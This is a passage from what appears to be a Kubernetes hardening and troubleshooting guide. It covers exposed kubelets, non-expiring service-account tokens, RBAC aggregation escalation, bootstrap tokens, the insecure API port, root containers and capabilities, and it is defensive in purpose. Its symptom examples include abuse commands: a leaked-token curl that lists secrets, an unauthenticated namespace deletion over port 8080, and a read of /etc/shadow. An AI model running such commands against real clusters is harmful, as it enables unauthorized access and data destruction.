  2. --authorization-mode=AlwaysAllow: The kubelet's authorization mode is set to AlwaysAllow — every request, authenticated or not, is authorized. Combined with anonymous-auth=true, anyone can execute any kubelet API call.
  3. Kubelet read-only port (10255) still open: --read-only-port=10255 provides UNAUTHENTICATED read-only access to pod information. Disable it with --read-only-port=0.
  4. No kubelet TLS certificate verification: The kubelet uses self-signed certs. Clients that skip TLS verification (-k flag) can connect without any certificate validation — the only remaining gate is authentication, which is disabled.
  5. Kubelet API exposed to pod network: There's no NetworkPolicy blocking pod-to-kubelet traffic on port 10250. Any compromised pod can reach ALL kubelets and execute commands in every container on every node.
🟡5 Less Likely Causes
  1. RBAC for system:anonymous grants kubelet API access: A ClusterRoleBinding grants nodes/proxy verb to system:anonymous. Anonymous users can now proxy through the API server to kubelets.
  2. Kubelet Webhook authorization misconfigured: --authorization-mode=Webhook points to an API server that returns allow for all kubelet API requests — effectively AlwaysAllow.
  3. Kubelet certificate signed by untrusted CA accepted: The kubelet's TLS cert is signed by a custom CA that the client trusts. Anonymous auth still applies, but the attacker has a valid TLS connection.
  4. Kubelet API accessible via cloud metadata proxy: Cloud provider's metadata service or load balancer accidentally routes traffic to kubelet port 10250 — exposing it to the internet.
  5. Kubelet debug endpoints enabled: --enable-debugging-handlers=true (default) exposes /debug/flags/v, /debug/pprof, and /logs — information disclosure about kubelet internals.
🟣5 New Cluster Causes
  1. Kubelet anonymous auth enabled by default in kubeadm: kubeadm does NOT disable anonymous auth on kubelets. This is a manual hardening step.
  2. CIS benchmark checks for kubelet not run: CIS 2.1.1 checks kubelet anonymous-auth. CIS 2.1.2 checks authorization-mode. CIS 2.1.5 checks read-only-port. These haven't been tested.
  3. No NetworkPolicy restricting pod-to-kubelet traffic: All pods can reach all kubelets on port 10250. A compromised pod has unrestricted kubelet API access.
  4. Kubelet configuration file not created: kubeadm can use a --config file for kubelet which centralizes all hardening settings. Relying on CLI flags means settings can be inconsistent.
  5. Cloud provider default firewall allows 10250: Cloud security group default allows all traffic within VPC. No restriction on kubelet port between nodes.
🔍 What to Look At:
ps aux | grep kubelet | grep -E "anonymous-auth|authorization-mode|read-only-port" Check kubelet flags. --anonymous-auth=false, --authorization-mode=Webhook, --read-only-port=0 are the secure settings.
curl -k https://<node-ip>:10250/healthz If this returns ok, the kubelet is accepting unauthenticated connections. Should return 401 Unauthorized.
kubectl get --raw /api/v1/nodes/<node>/proxy/pods/ Check if the API server proxy to kubelet works without authentication. This is a common attack path.
🎯 #1 Root Cause: Kubelet --anonymous-auth defaults to TRUE and --authorization-mode may be AlwaysAllow. This allows anyone who can reach port 10250 to execute commands, read logs, and access container filesystems without any credentials.
🔧 How to Solve:
1. Disable anonymous authentication on kubelet Add --anonymous-auth=false to kubelet config (/var/lib/kubelet/config.yaml). Restart kubelet. All unauthenticated requests will be rejected.
2. Set authorization mode to Webhook --authorization-mode=Webhook The kubelet will call the API server's SubjectAccessReview API for every request. RBAC policies are evaluated — least privilege enforced.
3. Disable the read-only port --read-only-port=0 Port 10255 provides unauthenticated read access to pod info. Disable it completely.
4. Add NetworkPolicy blocking pod-to-kubelet traffic Create a NetworkPolicy denying all traffic to port 10250 from pod CIDR. Only the API server and kube-system components should reach the kubelet API.
5. Run CIS benchmark checks 2.1.1-2.1.5 kube-bench run --targets node --check 2.1.1,2.1.2,2.1.5 Verifies kubelet authentication, authorization, and read-only port. Should all show PASS.
💡 Personal Advice:
The kubelet API is the most dangerous API in Kubernetes. Port 10250 gives you kubectl exec-level access to EVERY container on the node. Lock it down: anonymous-auth=false, authorization-mode=Webhook, read-only-port=0. Then add NetworkPolicy to restrict which IPs can even reach it.
The API server proxy to kubelet is an attack path. Even if you block direct pod-to-kubelet traffic, kubectl get --raw /api/v1/nodes/<n>/proxy/pods/ proxies through the API server. If anonymous users have this RBAC, they can reach kubelets via the API server.
CH12
🛡️ CATEGORY 2: CLUSTER HARDENING — Issue CH12
Legacy ServiceAccount Token Never Expires — Permanent Credential Theft

🔍 Symptom: The anihpj-api pod's ServiceAccount token was leaked into a public GitHub repository 6 months ago. The token is STILL VALID. kubectl get secret anihpj-api-token-xxxx -o json | jq '.data.token | @base64d' returns the same token that was in the GitHub leak. The token has no expiry date — it's a legacy non-time-limited token. Even after the pod was replaced and the deployment restarted, the leaked token remains valid and can still authenticate to the API server.

  kubectl get secret anihpj-api-token-xxxx -o json | jq -r '.data.token | @base64d' | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
  {
    "iss": "kubernetes/serviceaccount",
    "kubernetes.io/serviceaccount/credential-id": "LEGACY",  ← No expiry field!
    "sub": "system:serviceaccount:anihpj:anihpj-api"
  }

  curl -k -H "Authorization: Bearer <LEAKED_TOKEN>" https://api-server:6443/api/v1/namespaces/anihpj/secrets
  { "items": [...] }   ← STILL WORKS — 6 months after the leak!
🔴5 Most Likely Causes
  1. Legacy non-expiring ServiceAccount token: The token was created by the old TokenController which generates tokens that NEVER expire. These are JWTs without an exp claim. Once leaked, they remain valid until the Secret is manually deleted.
  2. Projected tokens with bounded lifetime not used: Kubernetes 1.22+ supports TokenRequest API that generates time-limited tokens (default 1 hour). The pod uses a legacy token Secret instead of a projected volume with expirationSeconds.
  3. Token Secret not regenerated after leak: The SA token Secret (anihpj-api-token-xxxx) still exists. Even though the GitHub leak was identified, no one deleted and regenerated the token Secret.
  4. ServiceAccount not recreated after compromise: The proper response to a token leak is to delete the SA token Secret (or the entire SA in older clusters). The SA will get a new token automatically. This was never done.
  5. No token revocation mechanism in place: Kubernetes does not support token revocation in the traditional sense. Legacy tokens remain valid until the Secret is deleted. There's no JWT revocation list or blacklist.
🟡5 Less Likely Causes
  1. Cluster upgraded but legacy tokens not migrated: Cluster upgraded from pre-1.22 to 1.32. Legacy tokens were not migrated to projected tokens. The old non-expiring tokens are still valid.
  2. --service-account-extend-token-expiration=true: This flag (default true) extends token expiration when the token is actively used. An attacker with a leaked token can keep it alive indefinitely by regularly calling the API.
  3. Token leaked in CI/CD pipeline logs: The CI system echoes the token during deployment. Build logs are retained for months — the token is accessible to anyone with CI access.
  4. Token stored in ConfigMap or ConfigMap-like resource: A developer saved the token in a ConfigMap "for debugging." The ConfigMap is readable by many ServiceAccounts — the token is now accessible to any compromised pod.
  5. Token audience allows use outside the cluster: The token's aud claim includes external services. The token can be used to authenticate to external systems as well as the API server.
🟣5 New Cluster Causes
  1. Default to legacy token generation: New kubeadm clusters still create legacy token Secrets for ServiceAccounts. Projected tokens require explicit Pod configuration.
  2. No token lifecycle policy: No policy for token rotation, expiration, or revocation. Tokens are created and forgotten.
  3. No SA token Secret audit: No regular audit of which SA token Secrets exist and how old they are. Tokens from deleted pods accumulate indefinitely.
  4. Developers unaware of projected tokens: Most teams don't know projected ServiceAccount tokens exist or how to use them. They continue using the default legacy token mount.
  5. No Git secret scanning in CI: No tool like trufflehog or git-secrets scanning commits for JWT tokens. Token leaks to Git repositories go undetected.
🔍 What to Look At:
kubectl get secrets -n anihpj -o json | jq '.items[] | select(.type=="kubernetes.io/service-account-token") | {name: .metadata.name, sa: .metadata.annotations["kubernetes.io/service-account.name"]}' Find all legacy SA token Secrets. Each one is a non-expiring credential that should be replaced with projected tokens.
kubectl get pod anihpj-api -n anihpj -o yaml | grep -A5 "serviceAccountToken" Check if the pod uses a projected token with expirationSeconds. If absent, it's using a legacy token.
kubectl get --raw /api/v1/namespaces/anihpj/serviceaccounts/anihpj-api/token Generate a NEW time-limited token via the TokenRequest API. This should replace all legacy token usage.
🎯 #1 Root Cause: Legacy ServiceAccount token Secrets generate non-expiring JWTs. The pod mounts a token Secret instead of using a projected ServiceAccount token volume with expirationSeconds. Once leaked, the token remains valid indefinitely.
🔧 How to Solve:
1. Switch to projected ServiceAccount tokens In Pod spec: volumes: [{name: sa-token, projected: {sources: [{serviceAccountToken: {expirationSeconds: 3600, path: token}}]}}]. Token auto-rotates and expires after 1 hour.
2. Delete legacy token Secrets kubectl delete secret anihpj-api-token-xxxx -n anihpj Legacy tokens become invalid. A new token Secret will be created if needed, but the old leaked token is dead.
3. Use TokenRequest API for external token needs kubectl create token anihpj-api -n anihpj --duration=1h For CI/CD or external tools, generate time-limited tokens via kubectl create token instead of extracting from token Secrets.
4. Implement Git secret scanning Add trufflehog or gitguardian to CI pipeline. Scan every commit for JWT tokens (look for eyJ patterns in JSON/base64 data).
5. Set up token lifecycle monitoring Monitor SA token Secret age. Alert on tokens older than 30 days. Automatically rotate tokens periodically via cronjob.
💡 Personal Advice:
Legacy tokens are permanent backdoors. Every legacy SA token Secret is a non-expiring credential. If one leaks, the attacker has permanent access — there is NO revocation. Migrate all pods to projected tokens with 1-hour expiry.
Use kubectl create token for one-off needs. Never extract tokens from Secrets for external use. Use kubectl create token <sa> --duration=1h to generate a time-limited token. It auto-expires.

📌 CH13–CH15: RBAC Escalation, Bootstrap Tokens & Insecure Port

CH13
🛡️ CATEGORY 2: CLUSTER HARDENING — Issue CH13
Aggregated ClusterRole Escalation — Label-Based Permission Leak

🔍 Symptom: A developer created a ClusterRole with an aggregationRule matching the label rbac.authorization.k8s.io/aggregate-to-admin: "true". This ClusterRole automatically picks up ALL permissions from other ClusterRoles that share this label. Now a ServiceAccount that was supposed to have "view" access has been silently escalated to "admin" — and no one explicitly changed the binding. The aggregation rule is a silent permission leak.

  kubectl get clusterrole my-custom-role -o yaml
  aggregationRule:
    clusterRoleSelectors:
    - matchLabels:
        rbac.authorization.k8s.io/aggregate-to-admin: "true"   ← Picks up ALL "admin" rules!

  kubectl auth can-i --list --as=system:serviceaccount:anihpj:anihpj-api
  Resources: *   Verbs: [get,list,watch,create,update,patch,delete]   ← ESCALATED!
🔴5 Most Likely Causes
  1. Aggregation rule matches a broad label: matchLabels: {rbac.authorization.k8s.io/aggregate-to-admin: "true"} matches ALL admin-level ClusterRoles — including cluster-admin if it was labeled. The aggregated role is effectively admin.
  2. Aggregated ClusterRole bound to a ServiceAccount: The aggregated role is bound via ClusterRoleBinding to a ServiceAccount. The SA now has all permissions from every ClusterRole matching the label — a permission union that may include escalate and bind.
  3. New ClusterRole with matching label added later: A new ClusterRole with the matching label was created AFTER the aggregation rule was reviewed. The aggregated role silently gained the new permissions — no one noticed because the aggregation rule and binding didn't change.
  4. Aggregation rule matches ALL ClusterRoles (empty selector): An empty clusterRoleSelectors: [{}] or matchLabels: {} matches EVERY ClusterRole. The aggregated role literally gets ALL permissions in the cluster.
  5. No documentation of aggregation impacts: Aggregation is a "set and forget" configuration. The team doesn't understand that adding a label to ANY ClusterRole silently grants those permissions to ALL aggregated roles with matching selectors.
🟡5 Less Likely Causes
  1. Malicious ClusterRole with matching label injected: An attacker with create clusterroles permission creates a ClusterRole with the aggregation label and verbs: ["*"] — all aggregated roles now have wildcard permissions.
  2. Kubernetes default aggregated roles modified: Built-in roles like admin, edit, and view use aggregation. If their labels are changed or they're bound unexpectedly, permissions leak to unintended users.
  3. Aggregation across multiple ClusterRoles creating escalation path: Role A aggregates Role B which aggregates Role C. The permission chain is invisible — a user of Role A inherits from C through B without any direct binding.
  4. Aggregated ClusterRole with the same name as a built-in role: A custom role named view with an aggregation rule overrides or extends the built-in view role. Users expecting "read-only" get "read-write" without knowing.
  5. Aggregation used to bypass RBAC audit tools: Tools that audit direct ClusterRoleBindings won't detect permissions gained through aggregation. The "effective permissions" are hidden behind indirection.
🟣5 New Cluster Causes
  1. Built-in aggregated roles not reviewed: kubeadm creates admin, edit, and view ClusterRoles with aggregation. Teams bind these without understanding their effective permissions.
  2. No RBAC aggregation audit process: No tool or process to evaluate effective permissions of aggregated roles before binding them to users or ServiceAccounts.
  3. Developers create aggregation rules for "convenience": Aggregation is used as a shortcut to avoid defining specific rules. Permissions are added implicitly via labels rather than explicitly via rules.
  4. Labels on ClusterRoles are not controlled: Anyone with update clusterroles can add labels to any ClusterRole, triggering silent permission changes in aggregated roles.
  5. RBAC policy doesn't restrict aggregation rule usage: No OPA/Gatekeeper policy validating aggregation rules to ensure they don't match admin-level roles or use empty selectors.
🔍 What to Look At:
kubectl get clusterroles -o yaml | grep -B5 "aggregationRule" Find all ClusterRoles using aggregation. Each one is a potential permission leak point.
kubectl auth can-i --list --as=system:serviceaccount:anihpj:anihpj-api | wc -l Compare the expected permissions (from explicit rules) with actual effective permissions. If there are MORE than expected, aggregation is adding permissions.
kubectl get clusterroles -l "rbac.authorization.k8s.io/aggregate-to-admin=true" Find all ClusterRoles with the aggregation label. The union of their rules is the effective permission set of the aggregated role.
🎯 #1 Root Cause: Aggregation rules silently accumulate permissions from all ClusterRoles matching a label. Any new ClusterRole with the matching label automatically extends the aggregated role — this is a silent, invisible permission escalation that cannot be detected by reviewing the aggregated role or its bindings alone.
🔧 How to Solve:
1. Audit all aggregated ClusterRoles kubectl get clusterroles -o json | jq '.items[] | select(.aggregationRule != null) | .metadata.name' List every ClusterRole with aggregation. For each, check which ClusterRoles match its selectors.
2. Restrict aggregation labels to specific, unique labels Instead of rbac.authorization.k8s.io/aggregate-to-admin, use a custom label like anihpj.io/aggregate-to-api-reader. This prevents unintended matching with built-in roles.
3. Replace aggregation with explicit rules when possible Aggregation is convenient but opaque. For security-critical roles, define explicit rules: instead of relying on aggregationRule:. You can SEE what permissions are granted.
4. Implement OPA policy to validate aggregation rules Policy: reject ClusterRoles with empty clusterRoleSelectors. Require aggregation labels to be in an approved namespace-prefixed format. Block aggregation to admin/edit/view labels.
5. Monitor effective permissions with RBAC audit tools Use rakkess or kubectl-who-can to evaluate effective permissions of aggregated roles. Alert when effective permissions exceed expected scope.
💡 Personal Advice:
Aggregation is powerful but dangerous. Use with extreme caution. An aggregation rule is an open door — any ClusterRole with the matching label walks through it. If you must use aggregation, use unique, organization-specific labels. Never use the built-in aggregation labels for custom roles.
Effective permissions > declared rules. When auditing RBAC, check kubectl auth can-i --list for the actual user/SA — NOT just the rules in the Role. Aggregation can add permissions that aren't visible in any single Role definition.
CH14
🛡️ CATEGORY 2: CLUSTER HARDENING — Issue CH14
Bootstrap Token Still Active — Cluster Join Credentials Never Revoked

🔍 Symptom: The kubeadm init bootstrap token, used once during initial cluster setup, is STILL ACTIVE and can be used to join new control plane nodes. kubeadm token list shows the bootstrap token with USES: authentication,signing — valid for BOTH node join AND API authentication. An attacker who discovers this token can join a malicious control plane node to the cluster, gaining access to etcd and all cluster data. The bootstrap token is the master key to the cluster — and it was never revoked.

  kubeadm token list
  TOKEN                     TTL   EXPIRES   USAGES                   DESCRIPTION
  abcdef.0123456789abcdef   23h   24h       authentication,signing   <none>
  xyz123.9876543210zyxwu   <forever> <never> authentication,signing   ← BOOTSTRAP TOKEN!

  kubectl get secrets -n kube-system | grep bootstrap-token
  bootstrap-token-xyz123    kubernetes.io/bootstrap-token    1   365d
🔴5 Most Likely Causes
  1. Bootstrap token created with no TTL: kubeadm token create --ttl 0 creates a token that NEVER expires. This is sometimes done during initial setup for convenience and never revisited.
  2. Bootstrap token used for API authentication: Tokens with USAGES: authentication can be used as Bearer tokens to authenticate to the API server. The bootstrap token grants system:bootstrappers group membership with elevated RBAC.
  3. Bootstrap token not deleted after cluster setup: kubeadm token delete <token> was never run. The token survives upgrades, node replacements, and even control plane migrations.
  4. Bootstrap token stored in plaintext files on nodes: /etc/kubernetes/join-command.sh or Ansible playbooks contain the bootstrap token in plaintext. These files remain on jump hosts and admin workstations.
  5. system:bootstrappers ClusterRoleBinding still active: The system:bootstrappers group has a ClusterRoleBinding to system:node-bootstrapper — allowing TOKEN HOLDERS to create CSRs for node certificates. An attacker can request a valid node client certificate.
🟡5 Less Likely Causes
  1. Token leaked in cluster management tool config: Rancher, kOps, or kubespray configuration files contain the bootstrap token in plaintext. These are often committed to Git.
  2. Bootstrap token printed in terminal output: kubeadm outputs the full token during init. Terminal scrollback buffers, screen recording, or log files capture the token.
  3. Multiple bootstrap tokens accumulated: Each time a node is added, a new token is created. Old tokens are never cleaned up — the cluster has 5+ active bootstrap tokens with no expiry.
  4. Bootstrap token used for emergency access: Operations team uses the bootstrap token as a "break-glass" credential. It's shared among team members and never rotated.
  5. Bootstrap token in cloud-init/userdata: Node bootstrap scripts in cloud-init contain the token. Anyone with cloud provider API access can retrieve userdata and extract the token.
🟣5 New Cluster Causes
  1. kubeadm init creates a 24h bootstrap token automatically: The token expires in 24 hours — but may be extended or replaced with a non-expiring token.
  2. No token lifecycle management after cluster setup: Token management is a "day 1" task that's never revisited. No policy for token rotation, expiry, or revocation.
  3. Join command saved for future use: kubeadm token create --print-join-command output is saved to a file for "when we need to add nodes." The token is never rotated.
  4. No monitoring for bootstrap token usage: Audit logs not configured to alert on authentication events using system:bootstrappers group. Token usage is invisible.
  5. No NetworkPolicy restricting API server access from untrusted IPs: Even with an active token, a NetworkPolicy could restrict which IPs can even reach the API server's join endpoint (port 6443).
🔍 What to Look At:
kubeadm token list Shows all active bootstrap tokens with their TTL and USAGES. Any token with TTL <forever> is a permanent backdoor.
kubectl get secrets -n kube-system -o json | jq '.items[] | select(.type=="bootstrap.kubernetes.io/token") | {name, data}' Find all bootstrap token Secrets stored in kube-system. Each one represents an active token.
kubectl get clusterrolebinding -o yaml | grep -B10 "system:bootstrappers" Check what permissions the bootstrapper group has. If bound to cluster-admin or system:node-bootstrapper, token holders have elevated access.
🎯 #1 Root Cause: Bootstrap token created without TTL (--ttl 0) and never deleted after cluster setup. The token remains valid indefinitely for both node joining AND API authentication, providing a permanent backdoor to anyone who possesses it.
🔧 How to Solve:
1. Delete ALL existing bootstrap tokens kubeadm token delete <token-id> Delete every token. If you need to join nodes later, create a new token with a SHORT TTL and delete it immediately after use.
2. Create time-limited tokens only when needed kubeadm token create --ttl 15m --print-join-command Never create tokens with --ttl 0. Always set a short TTL (15 minutes is usually enough). Delete the token after the node joins.
3. Remove authentication usage from bootstrap tokens kubeadm token create --usages signing Tokens should only have the signing usage — NOT authentication. This prevents the token from being used as a Bearer token for API access.
4. Search all nodes and workstations for token files find / -name "join-command*" -type f 2>/dev/null; find / -name "*.sh" -exec grep -l "kubeadm join" {} \; Hunt down every file containing the join command. Delete or rotate tokens found in any persistent storage.
5. Monitor bootstrap token usage via audit logs Create audit policy rule for system:bootstrappers group with level: RequestResponse. Alert on any authentication event from this group.
💡 Personal Advice:
Bootstrap tokens are master keys. Treat them accordingly. A bootstrap token with authentication,signing usage can join control plane nodes AND authenticate to the API server. This is cluster-admin access. Delete tokens immediately after use. Never store them permanently.
Short TTL + immediate deletion = secure bootstrap. Create tokens with --ttl 15m and --usages signing only. After the node joins, run kubeadm token delete <id>. No token should live longer than the join operation.
Check for token leaks in Git and logs. Bootstrap tokens are often committed to infrastructure repos or captured in CI logs. Search your Git history and log archives for kubeadm join commands containing tokens.
CH15
🛡️ CATEGORY 2: CLUSTER HARDENING — Issue CH15
Insecure Port (8080) Still Open — Complete API Server Bypass

🔍 Symptom: curl http://<api-server-ip>:8080/api/v1/namespaces returns ALL namespaces WITHOUT any authentication, TLS, or authorization. The kube-apiserver is running with --insecure-port=8080 (or the flag is absent, defaulting to 8080 in older versions). The insecure port BYPASSES ALL security — no TLS, no authentication, no authorization, no admission controllers. Anyone who can reach port 8080 has FULL cluster-admin access to the entire cluster with a single HTTP request.

  curl http://127.0.0.1:8080/api/v1/namespaces
  { "kind": "NamespaceList", "items": [...] }   ← NO TLS, NO AUTH, NO RBAC!

  curl -X DELETE http://127.0.0.1:8080/api/v1/namespaces/anihpj
  { "kind": "Namespace", "status": "Terminating" }   ← PRODUCTION NAMESPACE DESTROYED!

  ps aux | grep kube-apiserver | grep insecure-port
  --insecure-port=8080   ← STILL OPEN!
🔴5 Most Likely Causes
  1. --insecure-port not explicitly set to 0: In older Kubernetes versions (pre-1.20), the insecure port defaulted to 8080. If the flag is absent, port 8080 is OPEN with full cluster-admin access. Set --insecure-port=0 to disable.
  2. Insecure port bound to 0.0.0.0 (all interfaces): --insecure-bind-address=0.0.0.0 exposes the insecure port to the entire network, not just localhost. Anyone with network access can reach it.
  3. Insecure port used for "internal health checks": The team kept port 8080 open for monitoring or health checks, not realizing it provides UNAUTHENTICATED full API access — not just health endpoints.
  4. Legacy cluster upgraded but insecure port not disabled: The cluster started on Kubernetes 1.16 with insecure port enabled. It was upgraded to 1.32 but the insecure port flag was never removed.
  5. Insecure port used as a "local debugging" convenience: Developers run kubectl --server=http://localhost:8080 because it doesn't require certificates. This convenience leaves a gaping security hole in production.
🟡5 Less Likely Causes
  1. Insecure port exposed via Kubernetes Service: Someone created a Service/Endpoint pointing to the API server's insecure port. The insecure API is now accessible from inside the cluster via a Service name.
  2. Insecure port forwarded via SSH tunnel: An SSH tunnel forwards localhost:8080 from the control plane node to a developer's laptop. The insecure port is now accessible from outside the cluster network.
  3. Cloud firewall rule allows 8080 inbound: Cloud security group has a rule allowing port 8080 for "API server health checks." The insecure API server is internet-accessible.
  4. Insecure port used by aggregated API server: An aggregated API server (metrics-server, service-catalog) connects via the insecure port because TLS configuration is "too complex."
  5. Insecure port enabled during troubleshooting and never disabled: An admin temporarily enabled the insecure port to debug an RBAC issue. The flag was left in the manifest — the port remains open weeks later.
🟣5 New Cluster Causes
  1. Older kubeadm/kOps version with insecure port default: Clusters installed with older tools may have the insecure port enabled by default. Upgrades don't automatically disable it.
  2. No CIS benchmark check for insecure port: CIS 1.2.16 specifically tests for --insecure-port=0. kube-bench hasn't been run.
  3. API server manifest not reviewed after bootstrap: kubeadm generates the manifest. The insecure port flag is either absent (defaulting to open) or present with port 8080.
  4. No network-level restriction on port 8080: Even if the insecure port is open, a host firewall (iptables/nftables) could restrict access to localhost only. But no firewall rules are applied.
  5. No egress NetworkPolicy blocking pod-to-8080: A compromised pod could reach the insecure port on the control plane node and gain instant cluster-admin via a simple curl.
🔍 What to Look At:
ps aux | grep kube-apiserver | grep insecure-port If --insecure-port=0 is absent or set to a non-zero value, the insecure port is OPEN. This is a CRITICAL finding.
ss -tlnp | grep 8080 Check if port 8080 is actually listening on the control plane node. If kube-apiserver is listed, the insecure port is active.
curl -s http://localhost:8080/healthz If this returns ok, the insecure port is accepting traffic. /healthz should NOT be accessible without TLS.
🎯 #1 Root Cause: --insecure-port is not set to 0, leaving port 8080 open. The insecure port bypasses ALL Kubernetes security: no TLS, no authentication, no RBAC authorization, no admission controllers. Any connection to port 8080 has unrestricted cluster-admin access.
🔧 How to Solve:
1. Disable the insecure port IMMEDIATELY --insecure-port=0 Add this flag to the kube-apiserver static pod manifest. The API server restarts. Port 8080 is no longer listening.
2. Also set insecure-bind-address to localhost if needed --insecure-bind-address=127.0.0.1 If the port must stay open temporarily, bind it ONLY to localhost — NOT 0.0.0.0. But the real fix is --insecure-port=0.
3. Verify port is closed ss -tlnp | grep kube-apiserver Should only show port 6443 (secure port). Port 8080 should NOT appear in the output.
4. Add host firewall rule blocking 8080 iptables -A INPUT -p tcp --dport 8080 -j DROP Defense in depth: even if the insecure port is accidentally re-enabled, the firewall blocks all connections to it.
5. Run CIS benchmark check 1.2.16 kube-bench run --targets master --check 1.2.16 Verifies --insecure-port=0. Should show PASS. If FAIL, the insecure port is still open.
💡 Personal Advice:
Port 8080 open = no security whatsoever. The insecure port bypasses TLS, authentication, authorization, AND admission control. A single curl from anyone with network access gives full cluster-admin. This is the MOST DANGEROUS misconfiguration in Kubernetes. Set --insecure-port=0 on every API server. No exceptions.
Modern Kubernetes (1.20+) has removed the insecure port entirely. If you're on 1.32 and still see insecure port references, they came from a legacy configuration. The flag is deprecated and no longer functional on recent versions — but check anyway. On older clusters, it's a critical vulnerability.

🖥️ Category 3: System Hardening (10 Issues)SH1-SH10

🟢 System Hardening — Kernel, Container Runtime, OS Security

System Hardening addresses the Linux-level security controls that protect against container escape and node compromise. Running containers as root, unconfined seccomp profiles, and missing AppArmor policies are the most common attack vectors for container-to-node breakout. For anihpj/jobpost, every container must run as non-root with capabilities dropped, seccomp and AppArmor enforced, and the root filesystem read-only.

📌 SH1–SH3: Non-Root, Capabilities & Seccomp

SH1
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH1
Container Running as Root — No runAsNonRoot Enforcement

🔍 Symptom: kubectl exec anihpj-api -- id returns uid=0(root) gid=0(root). The container runs as the ROOT user — it has unrestricted access to the container filesystem and all Linux capabilities (by default). If an attacker exploits the Django application (e.g., RCE via insecure deserialization), they get root INSIDE the container — the first step toward container escape. runAsNonRoot: true is not set in the pod's securityContext.

  kubectl exec anihpj-api -n anihpj -- id
  uid=0(root) gid=0(root) groups=0(root)   ← ROOT inside container!

  kubectl exec anihpj-api -n anihpj -- cat /etc/shadow
  root:!$6$xyz...:19000:0:99999:7:::   ← Can read shadow file!

  kubectl get pod anihpj-api -n anihpj -o yaml | grep -A3 securityContext
  securityContext: {}
  # No runAsNonRoot, no runAsUser, no capabilities drop!
🔴5 Most Likely Causes
  1. runAsNonRoot not set in securityContext: The most basic container security control is MISSING. securityContext: {runAsNonRoot: true} is not in the Pod spec. Without it, the container runs as whatever user the image defines — usually root (UID 0).
  2. Dockerfile defaults to root user: Most base images (python, node, nginx) default to USER root. The Dockerfile never has USER 1000 — the application runs as root inside the container from the start.
  3. No Pod Security Standard enforcing non-root: The namespace has no pod-security.kubernetes.io/enforce=restricted label. The restricted profile REQUIRES runAsNonRoot: true — but it's not applied.
  4. Developer runs as root for "convenience": File permission issues during development lead to USER root as a workaround. The workaround is never fixed before production deployment.
  5. No admission controller blocking root containers: No OPA/Gatekeeper policy to reject pods without runAsNonRoot: true. Root containers are admitted without any warning.
🟡5 Less Likely Causes
  1. runAsUser set to 0 explicitly: securityContext: {runAsUser: 0} FORCES the container to run as root, overriding any Dockerfile USER directive. This is worse than the default.
  2. Image entrypoint requires root for bind to port < 1024: The app binds to port 80 or 443 which requires root (CAP_NET_BIND_SERVICE). Instead of using capabilities.add: [NET_BIND_SERVICE], the team runs as root.
  3. Volume mount ownership requires root: A PersistentVolume or hostPath mount has files owned by root. The app can't read/write them without running as root. Fix: use initContainers to chown or use fsGroup.
  4. No USER directive in Dockerfile at all: The Dockerfile never sets a USER — Kubernetes has no user to run as. The container defaults to whatever user the base image's last USER was (usually root).
  5. Root needed for package installation in entrypoint: The container entrypoint runs apt-get install or pip install at startup — requiring root. This anti-pattern forces the entire application to run as root.
🟣5 New Cluster Causes
  1. PodSecurity admission labels not applied to namespace: New namespaces have no security labels. Root containers are allowed by default.
  2. No container security policy defined: No organization-wide policy requiring runAsNonRoot: true in all Deployment specs.
  3. Developers unaware of container security context: Container security context is an "advanced" topic that many developers never learn. Deployments are created without any securityContext.
  4. Default Docker images used without review: Team pulls python:3.12 which runs as root. No custom image with non-root user is created.
  5. No OPA/Gatekeeper policy for runAsNonRoot: Policy engine not deployed. Root container detection relies on manual review which doesn't scale.
🔍 What to Look At:
kubectl get pods -n anihpj -o json | jq '.items[] | {name:.metadata.name, user: .spec.containers[].securityContext.runAsUser, nonRoot: .spec.containers[].securityContext.runAsNonRoot}' Check which pods have securityContext set and which run as root. Any pod with runAsNonRoot: null or runAsUser: null likely runs as root.
kubectl exec <pod> -- id The definitive check — if it shows uid=0(root), the container is running as root. Non-root containers show uid=1000 or similar.
kubectl describe ns anihpj | grep pod-security Verify Pod Security Standard labels. enforce=restricted blocks root containers at admission time.
🎯 #1 Root Cause: runAsNonRoot: true is not set in the container's securityContext, and the container image defaults to the root user (UID 0). Without this single field, the container runs with full root privileges inside the container — the first step in any container escape attack chain.
🔧 How to Solve:
1. Add runAsNonRoot and runAsUser to securityContext securityContext: runAsNonRoot: true runAsUser: 1000 allowPrivilegeEscalation: false Add to spec.template.spec.containers[].securityContext. The container must now run as UID 1000.
2. Add USER directive to Dockerfile USER 1000 Set a non-root user in the image. Kubernetes will use this as the default if runAsUser is not explicitly set.
3. Apply Pod Security Standard restricted to namespace kubectl label ns anihpj pod-security.kubernetes.io/enforce=restricted Blocks all pods without runAsNonRoot: true at admission time. Existing pods are grandfathered — restart to enforce.
4. Use initContainers for file permission fixes If volumes need root ownership, use an initContainer running as root to chown 1000:1000 /data, then the main container runs as UID 1000 with access to the volume.
5. Deploy OPA policy for mandatory runAsNonRoot Policy: reject any pod where runAsNonRoot != true OR runAsUser == 0. Catch root containers at admission time cluster-wide.
💡 Personal Advice:
Root inside the container is the prerequisite for almost every container escape. You can't break out of a container if you're not root inside it. Setting runAsNonRoot: true is the single most impactful security control you can apply — it costs nothing and blocks the most common attack path.
Use the restricted Pod Security Standard as your baseline. The restricted profile enforces runAsNonRoot, seccomp, and allowPrivilegeEscalation: false. Apply it to every namespace and fix violations — don't relax the standard.
initContainers solve the volume permission problem. If your app needs to write to a volume owned by root, use an initContainer (which CAN run as root) to fix permissions. The main container stays non-root. This is the secure pattern.
SH2
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH2
Linux Capabilities Not Dropped — Container Has CAP_SYS_ADMIN

🔍 Symptom: kubectl exec anihpj-api -- capsh --print shows the container has dozens of Linux capabilities including CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_SYS_PTRACE, and CAP_SYS_RAWIO. No capabilities have been dropped. CAP_SYS_ADMIN alone allows mounting filesystems, loading kernel modules, and performing privileged namespace operations — it's essentially "root but scarier." The container has ALL default capabilities: the attacker can mount cgroup v1 and escape the container.

  kubectl exec anihpj-api -n anihpj -- capsh --print
  Current: cap_sys_admin,cap_net_admin,cap_sys_ptrace,cap_sys_rawio,cap_sys_module,...
  Bounding set: cap_chown,cap_dac_override,cap_fowner,cap_setuid,cap_setgid,
    cap_sys_admin,cap_net_admin,cap_sys_ptrace,...   ← 20+ CAPABILITIES!

  kubectl get pod anihpj-api -n anihpj -o yaml | grep -A10 securityContext
  securityContext: {runAsNonRoot: true}   # No capabilities.drop!
🔴5 Most Likely Causes
